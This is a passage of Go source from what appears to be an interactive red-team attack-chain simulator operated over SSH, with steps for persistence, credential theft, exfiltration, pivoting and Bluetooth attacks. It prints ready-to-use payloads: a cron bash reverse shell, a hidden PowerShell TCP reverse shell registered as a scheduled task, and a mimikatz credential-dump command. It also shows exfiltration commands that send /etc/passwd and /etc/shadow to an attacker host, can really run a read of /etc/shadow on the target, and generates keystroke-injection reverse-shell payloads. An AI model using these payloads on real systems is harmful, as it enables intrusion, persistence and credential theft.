		fmt.Println("  For Windows, typical methods: scheduled task or registry run key.")
		fmt.Println("  Example: `schtasks /create /tn \"Updater\" /tr \"powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...\" /sc minute /mo 5`")
	}
	fmt.Print(Yellow + "Do you want to see a full payload generation example? (y/n): " + Reset)
	show, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(show)) == "y" {
		fmt.Println(Cyan + "Example payload (Linux reverse shell via cron):" + Reset)
		fmt.Println(`(crontab -l 2>/dev/null; echo '*/5 * * * * bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"') | crontab -`)
		fmt.Println(Cyan + "Example payload (Windows reverse shell via schtasks):" + Reset)
		fmt.Println(`schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" /sc minute /mo 5`)
	}
	common.PausePrompt()
}

// Step 3: Credential Stealing (simulation)
func runCredentialStep(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	fmt.Println(Yellow + "[+] Credential Stealing Simulation" + Reset)
	fmt.Println("  This step shows how an attacker would attempt to extract credentials.")
	if osType == "Linux" || osType == "Darwin" {
		fmt.Println("  On Linux, common targets: /etc/shadow, /etc/passwd, memory dumps, SSH keys.")
		fmt.Println("  Example: `sudo cat /etc/shadow` (requires root) or `find ~/.ssh -type f`.")
	} else {
		fmt.Println("  On Windows, common targets: SAM database, LSASS memory, credential vaults.")
		fmt.Println("  Example: `mimikatz.exe privilege::debug sekurlsa::logonpasswords`")
	}
	fmt.Print("Do you want to check if /etc/shadow is readable? (y/n): ")
	check, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(check)) == "y" {
		cmd := "sudo cat /etc/shadow 2>/dev/null | head -5 || echo 'Cannot read /etc/shadow (requires root)'"
		fmt.Println(Cyan + "[DRY-RUN] " + cmd + Reset)
		fmt.Print("Execute? (y/n): ")
		exec, _ := reader.ReadString('\n')
		if strings.TrimSpace(strings.ToLower(exec)) == "y" {
			out, _ := runSafeCommand(client, cmd, sudoPassword, 10*time.Second, false)
			fmt.Println(Blue + "=== OUTPUT ===" + Reset)
			fmt.Println(out)
			fmt.Println(Blue + "=============" + Reset)
		}
	}
	common.PausePrompt()
}

// Step 4: Exfiltration (simulation)
func runExfilStep(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	fmt.Println(Yellow + "[+] Data Exfiltration Simulation" + Reset)
	fmt.Println("  This step shows how data can be exfiltrated using common protocols.")
	fmt.Println("  Example: `curl -X POST -d @/etc/passwd http://attacker_server/exfil`")
	fmt.Println("  or using netcat: `nc attacker_ip 4444 < /etc/shadow`")
	fmt.Print("Do you want to simulate exfiltration of a dummy file? (y/n): ")
	sim, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(sim)) == "y" {
		fmt.Print("Enter a dummy file path to exfiltrate (e.g., /tmp/test.txt): ")
		file, _ := reader.ReadString('\n')
		file = strings.TrimSpace(file)
		fmt.Print("Enter attacker IP (fake): ")
		attackerIP, _ := reader.ReadString('\n')
		attackerIP = strings.TrimSpace(attackerIP)
		fmt.Print("Enter attacker port: ")
		port, _ := reader.ReadString('\n')
		port = strings.TrimSpace(port)
		cmd := fmt.Sprintf("echo 'Simulated exfiltration' > %s; cat %s | nc %s %s || echo 'Exfiltration simulated (netcat not available)'", file, file, attackerIP, port)
		fmt.Println(Cyan + "[DRY-RUN] " + cmd + Reset)
		fmt.Print("Execute? (y/n): ")
		exec, _ := reader.ReadString('\n')
		if strings.TrimSpace(strings.ToLower(exec)) == "y" {
			out, _ := runSafeCommand(client, cmd, sudoPassword, 10*time.Second, false)
			fmt.Println(Blue + "=== OUTPUT ===" + Reset)
			fmt.Println(out)
			fmt.Println(Blue + "=============" + Reset)
		}
	}
	common.PausePrompt()
}

// Step 5: Pivot (SSH tunneling)
func runPivotStep(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	fmt.Println(Yellow + "[+] Network Pivoting Simulation" + Reset)
	fmt.Println("  This shows how an attacker uses a compromised host to reach internal networks.")
	fmt.Println("  Technique: SSH local port forwarding (`ssh -L`).")
	fmt.Print("Enter a remote internal IP to reach (e.g., 192.168.1.100): ")
	remoteHost, _ := reader.ReadString('\n')
	remoteHost = strings.TrimSpace(remoteHost)
	fmt.Print("Enter remote port: ")
	remotePort, _ := reader.ReadString('\n')
	remotePort = strings.TrimSpace(remotePort)
	fmt.Print("Enter local port to forward on attacker machine: ")
	localPort, _ := reader.ReadString('\n')
	localPort = strings.TrimSpace(localPort)
	cmd := fmt.Sprintf("ssh -L %s:%s:%s localhost -Nf", localPort, remoteHost, remotePort)
	fmt.Println(Cyan + "[DRY-RUN] Command: " + cmd + Reset)
	fmt.Println(Yellow + "Note: This would be run on the attacker machine, not the target." + Reset)
	fmt.Print("Do you want to simulate execution (dry-run only)? (y/n): ")
	sim, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(sim)) == "y" {
		fmt.Println(Cyan + "Simulation: SSH tunnel would forward traffic from local port " + localPort + " to " + remoteHost + ":" + remotePort + "." + Reset)
	}
	common.PausePrompt()
}

// Step 6: Run All Steps Sequentially
func runFullChainSequential(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	fmt.Println(Yellow + "Starting Full Attack Chain Simulation...")
	fmt.Print("Are you sure you want to run ALL steps sequentially? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
		return
	}
	steps := []func(){
		func() { runPrivEscStep(reader, client, host, sudoPassword, osType) },
		func() { runPersistenceStep(reader, client, host, sudoPassword, osType) },
		func() { runCredentialStep(reader, client, host, sudoPassword, osType) },
		func() { runExfilStep(reader, client, host, sudoPassword, osType) },
		func() { runPivotStep(reader, client, host, sudoPassword, osType) },
	}
	for i, step := range steps {
		fmt.Printf(Cyan + "\n--- Step %d ---\n" + Reset, i+1)
		step()
		fmt.Print("Press Enter to continue to next step...")
		_, _ = reader.ReadString('\n')
	}
	fmt.Println(Green + "✅ Full attack chain simulation completed." + Reset)
	common.PausePrompt()
}

// ---------------------------------------------------------------------
// 10. Bluetooth Attack Simulation
// ---------------------------------------------------------------------
func runBluetoothMenu(reader *bufio.Reader, client *ssh.Client, host, sudoPassword, osType string) {
	for {
		fmt.Print("\033[H\033[2J")
		fmt.Println(Red + Bold + "📶 BLUETOOTH ATTACK SIMULATION" + Reset)
		fmt.Printf(Yellow+"Target: "+Reset+Bold+"%s (%s)\n"+Reset, host, osType)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)
		fmt.Println("  [1] 🔍 Scan for Bluetooth Devices")
		fmt.Println("  [2] 🔗 Attempt 'Just Works' Pairing (simulated)")
		fmt.Println("  [3] ⌨️ Keystroke Injection (simulated)")
		fmt.Println("  [4] 🛡️ BlueBorne Vulnerability Check")
		fmt.Println("  [5] ▶️ Run All Steps Sequentially")
		fmt.Println(Red + "  [0] Back" + Reset)
		fmt.Println(Blue + "------------------------------------------------------------------" + Reset)

		fmt.Print(Bold + "Select option [0-5]: " + Reset)
		input, _ := reader.ReadString('\n')
		choice := strings.TrimSpace(input)

		if choice == "0" || choice == "q" || choice == "Q" {
			return
		}

		switch choice {
		case "1":
			runBluetoothScan(reader, client, sudoPassword)
		case "2":
			runBluetoothPairing(reader, client, sudoPassword)
		case "3":
			runBluetoothInject(reader)
		case "4":
			runBlueBorneCheck(reader, client, sudoPassword)
		case "5":
			runBluetoothSequential(reader, client, sudoPassword)
		default:
			fmt.Println(Yellow + "[!] Invalid choice." + Reset)
		}
	}
}

func runBluetoothScan(reader *bufio.Reader, client *ssh.Client, sudoPassword string) {
	fmt.Println(Yellow + "[+] Checking Bluetooth adapter..." + Reset)
	check := "sudo hciconfig | grep -q 'BD Address' && echo OK || echo FAIL"
	out, _ := runSafeCommand(client, check, sudoPassword, 5*time.Second, false)
	if strings.TrimSpace(out) != "OK" {
		fmt.Println(Yellow + "[!] No Bluetooth adapter found." + Reset)
		common.PausePrompt()
		return
	}

	fmt.Println(Yellow + "[+] Scanning for devices (15 seconds)...")
	cmd := `sudo bash -c "echo -e 'power on\nscan on\nsleep 10\ndevices\nscan off\nexit' | bluetoothctl 2>/dev/null | grep -E '^Device' || echo 'No devices found'"`
	fmt.Println(Cyan + "[DRY-RUN] " + cmd + Reset)

	fmt.Print("Execute scan? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
		return
	}

	out, err := runSafeCommand(client, cmd, sudoPassword, 20*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] Scan error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== DEVICES FOUND ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "====================" + Reset)
	common.PausePrompt()
}

func runBluetoothPairing(reader *bufio.Reader, client *ssh.Client, sudoPassword string) {
	fmt.Println(Yellow + "[+] Attempt 'Just Works' Pairing (simulated)" + Reset)
	fmt.Println("  This simulates pairing with a target device without user confirmation.")
	fmt.Print("Enter target MAC address (e.g., AA:BB:CC:DD:EE:FF): ")
	mac, _ := reader.ReadString('\n')
	mac = strings.TrimSpace(mac)
	if mac == "" {
		fmt.Println(Yellow + "[!] No MAC entered. Aborting." + Reset)
		return
	}
	fmt.Println(Cyan + "[DRY-RUN] Would attempt to pair with " + mac + " using 'Just Works'." + Reset)
	fmt.Print("Do you want to simulate pairing (no actual action)? (y/n): ")
	sim, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(sim)) == "y" {
		fmt.Println(Cyan + "Simulation: Pairing initiated. Target device would accept silently." + Reset)
	}
	common.PausePrompt()
}

func runBluetoothInject(reader *bufio.Reader) {
	fmt.Println(Yellow + "[+] Keystroke Injection Simulation" + Reset)
	fmt.Println("  This generates a reverse shell payload that could be injected via a virtual Bluetooth keyboard.")
	fmt.Print("Enter your attacker IP: ")
	attackerIP, _ := reader.ReadString('\n')
	attackerIP = strings.TrimSpace(attackerIP)
	fmt.Print("Enter your attacker port: ")
	attackerPort, _ := reader.ReadString('\n')
	attackerPort = strings.TrimSpace(attackerPort)

	payload := fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", attackerIP, attackerPort)
	fmt.Println(Cyan + "Generated payload (to be typed via Bluetooth HID):" + Reset)
	fmt.Println(payload)
	fmt.Print("Simulate injection? (y/n): ")
	sim, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(sim)) == "y" {
		fmt.Println(Cyan + "Simulation: Payload would be typed as keystrokes." + Reset)
	}
	common.PausePrompt()
}

func runBlueBorneCheck(reader *bufio.Reader, client *ssh.Client, sudoPassword string) {
	fmt.Println(Yellow + "[+] BlueBorne Vulnerability Check" + Reset)
	fmt.Println("  Checks for known Bluetooth stack vulnerabilities.")
	cmd := `if command -v blueborne-scanner >/dev/null 2>&1; then
		blueborne-scanner 2>/dev/null | head -20
	else
		echo "blueborne-scanner not installed. Manual checks recommended."
		echo "For Linux: check if your kernel is patched (CVE-2017-0781, CVE-2017-0782, etc.)"
		echo "For Windows: ensure latest updates are applied."
	fi`
	fmt.Println(Cyan + "[DRY-RUN] " + cmd + Reset)
	fmt.Print("Execute check? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
		return
	}
	out, err := runSafeCommand(client, cmd, sudoPassword, 30*time.Second, false)
	if err != nil {
		fmt.Printf(Red+"[!] BlueBorne check error: %v\n"+Reset, err)
	}
	fmt.Println(Blue + "=== BLUEBORNE CHECK ===" + Reset)
	fmt.Println(out)
	fmt.Println(Blue + "======================" + Reset)
	common.PausePrompt()
}

func runBluetoothSequential(reader *bufio.Reader, client *ssh.Client, sudoPassword string) {
	fmt.Println(Yellow + "Running all Bluetooth attack steps sequentially...")
	runBluetoothScan(reader, client, sudoPassword)
	fmt.Print("Press Enter to continue...")
	_, _ = reader.ReadString('\n')
	runBluetoothPairing(reader, client, sudoPassword)
	fmt.Print("Press Enter to continue...")
	_, _ = reader.ReadString('\n')
	runBluetoothInject(reader)
	fmt.Print("Press Enter to continue...")
	_, _ = reader.ReadString('\n')
	runBlueBorneCheck(reader, client, sudoPassword)
	fmt.Println(Green + "✅ Bluetooth simulation completed." + Reset)
	common.PausePrompt()
}